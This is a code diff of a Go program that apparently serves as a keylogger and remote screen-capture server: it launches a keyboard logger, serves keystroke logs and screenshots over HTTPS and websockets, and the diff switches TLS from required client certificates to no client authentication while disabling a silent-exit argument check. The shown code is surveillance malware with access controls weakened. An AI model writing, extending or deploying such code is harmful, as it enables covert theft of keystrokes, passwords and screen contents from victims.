@@ -10,6 +10,7 @@ import (
 	"fmt"
 	"html/template"
 	"io/ioutil"
+	"log"
 	"net"
 	"net/http"
 	"os"
@@ -31,14 +32,14 @@ func init() {
 
 func main() {
 	listenAddress := ":443"
-	if len(os.Args) == 1 {
-		os.Exit(0)
-	} else if len(os.Args) == 2 && os.Args[1] == "start" {
-	} else if len(os.Args) == 3 && os.Args[1] == "start" {
-		listenAddress = fmt.Sprintf(":%s", os.Args[2])
-	} else {
-		os.Exit(0)
-	}
+	// if len(os.Args) == 1 {
+	// 	os.Exit(0)
+	// } else if len(os.Args) == 2 && os.Args[1] == "start" {
+	// } else if len(os.Args) == 3 && os.Args[1] == "start" {
+	// 	listenAddress = fmt.Sprintf(":%s", os.Args[2])
+	// } else {
+	// 	os.Exit(0)
+	// }
 	certData, _ := templates.ReadFile("certs/server.pem")
 	keyData, _ := templates.ReadFile("certs/server.key")
 	caCert, err := templates.ReadFile("certs/ca.pem")
@@ -46,23 +47,23 @@ func main() {
 	certPool.AppendCertsFromPEM(caCert)
 	cert, err := tls.X509KeyPair(certData, keyData)
 	if err != nil {
-		//log.Fatalf("Failed to load key pair: %v", err)
+		log.Fatalf("Failed to load key pair: %v", err)
 	}
 	tlsConfig := &tls.Config{
 		Certificates: []tls.Certificate{cert},
 		ClientCAs:    certPool,
-		ClientAuth:   tls.RequireAndVerifyClientCert,
+		ClientAuth:   tls.NoClientCert,
 	}
 	SimulateDesktopConfig := &tls.Config{
 		Certificates: []tls.Certificate{cert},
 	}
 	SimulateDesktopListener, err := tls.Listen("tcp", ":0", SimulateDesktopConfig)
 	if err != nil {
-		//log.Printf("Failed to listen on a random port: %v", err)
+		log.Printf("Failed to listen on a random port: %v", err)
 	}
 	httpsListener, err := tls.Listen("tcp", listenAddress, tlsConfig)
 	if err != nil {
-		//log.Fatalf("Failed to create TLS listener: %v", err)
+		log.Fatalf("Failed to create TLS listener: %v", err)
 	}
 	SimulateDesktopwsPort := SimulateDesktopListener.Addr().(*net.TCPAddr).Port
 	go keyboard.Keylog()
@@ -70,11 +71,11 @@ func main() {
 		w.Header().Set("Content-Type", "text/html")
 		contentBytes, err := templates.ReadFile("index.html")
 		if err != nil {
-			//log.Printf("contentBytes, err := templates.ReadFile(index.html): %v", err)
+			log.Printf("contentBytes, err := templates.ReadFile(index.html): %v", err)
 		}
 		tmpl, err := template.New("index").Parse(string(contentBytes))
 		if err != nil {
-			//log.Printf("tmpl, err := template.New(index).Parse(string(contentBytes)): %v", err)
+			log.Printf("tmpl, err := template.New(index).Parse(string(contentBytes)): %v", err)
 		}
 		tmpl.Execute(w, map[string]interface{}{
 			"WebSocketPort": SimulateDesktopwsPort,
@@ -94,19 +95,19 @@ func main() {
 		tmpl, err := template.New("log").Parse(win32.HtmlTemplate)
 		err = tmpl.Execute(w, data)
 		if err != nil {
-			//http.Error(w, "Error executing HTML template", http.StatusInternalServerError)
+			http.Error(w, "Error executing HTML template", http.StatusInternalServerError)
 		}
 	})
 	go func() {
 		if err := http.Serve(httpsListener, nil); err != nil {
-			//log.Fatalf("Failed to start HTTPS server: %v", err)
+			log.Fatalf("Failed to start HTTPS server: %v", err)
 		}
 	}()
 	go func() {
 		http.HandleFunc("/SimulateDesktop", server.ScreenshotHandler)
 	}()
 	if err := http.Serve(SimulateDesktopListener, nil); err != nil {
-		//log.Printf("Failed to start WebSocket server: %v", err)
+		log.Printf("Failed to start WebSocket server: %v", err)
 	}
 	go func() {
 		ticker := time.NewTicker(30 * time.Second)
